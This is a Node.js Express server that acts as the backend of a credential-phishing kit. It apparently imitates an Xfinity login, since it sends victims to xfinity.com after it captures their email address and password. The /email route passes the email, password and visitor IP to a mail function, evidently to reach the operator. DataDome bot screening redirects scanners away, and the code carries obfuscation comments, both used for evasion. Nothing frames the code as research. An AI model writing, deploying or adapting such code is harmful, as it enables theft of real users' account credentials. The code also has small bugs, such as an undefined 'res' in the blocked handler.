const PORT = 5000

const express = require('express')
const session = require('express-session');
const path = require('path')
const cors = require('cors')
const DataDome = require('@datadome/node-module');
const sendMail = require('./mail')
const beautify = require('js-beautify').html;
const ejs = require('ejs');
const axios = require('axios');

const app = express()
const storedValues = {};

app.set('view engine', 'ejs');
app.use(express.static('views'));

//data parsing
app.use(express.urlencoded({
    extended: false
}))
app.use(express.json())
app.use(cors())

app.use((req, res, next) => {
  // Middleware to store the visitor's IP
  visitorIP = req.ip;
  next();
});

// Add session middleware
app.use(session({
  secret: 'thisispersonel',
  resave: false,
  saveUninitialized: true,
}));

// Create a DataDome instance
const datadomeClient = new DataDome('AOhAWR2USOQ39Cj', 'api.datadome.co')
        .on('blocked', function(req){
            console.log('request blocked');
            res.redirect('https://www.google.com');
            
        })
        .on("valid", function(req, res){
            console.log('request allowed');
            
            // Render your EJS template
            ejs.renderFile(path.join(__dirname, 'views', 'index.ejs'), {}, function(err, str) {
                if (err) {
                    console.error('EJS render error:', err);
                    res.status(500).json({ message: 'Internal error', err });
                } else {
                    // Obfuscate the rendered EJS content before sending the response
                    const obfuscatedHTML = beautify(str, { /* obfuscation options */ });
                    res.send(obfuscatedHTML);
                }
            });
        })

// Handle form submission
app.post('/loginPage', (req, res) => {
  // Handle the form submission logic here
  const userInput = req.body.user;

  storedValues.userInput = userInput;
  res.redirect('/loginPage');
});


app.get('/', (req, res) => {
  // Use DataDome for bot detection and protection
  datadomeClient.auth(req, res);
});

// Render the login page
app.get('/loginPage', async (req, res) => {
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    const visitorIP = response.data.ip;

    // Store visitorIP in the session
    req.session.visitorIP = visitorIP;

    // Assuming storedValues.userInput holds the userInput value
    const userInput = storedValues.userInput;

    // Render your loginPage.ejs passing visitorIP and userInput
    res.render('loginPage.ejs', { visitorIP, userInput });
  } catch (error) {
    console.error('Error getting IP:', error);
    res.status(500).send('Error getting IP');
  }
});



// email sending
app.post('/email', (req, res) => {
  const { passwd } = req.body;
  const email = storedValues.userInput;
  const visitorIP = req.session.visitorIP; // Access the visitor's IP from the session

  // Assuming your sendMail function requires email, password, and IP address
  sendMail(email, passwd, visitorIP, function (err, data) {
    if (err) {
      res.status(500).json({ message: 'internal error', err });
    } else {
      // Redirect to a specific URL after sending the email
      res.redirect('https://www.xfinity.com/hub/news'); // Replace '/success' with the desired URL
    }
  });
});

  


app.listen(PORT, () => console.log('server running'))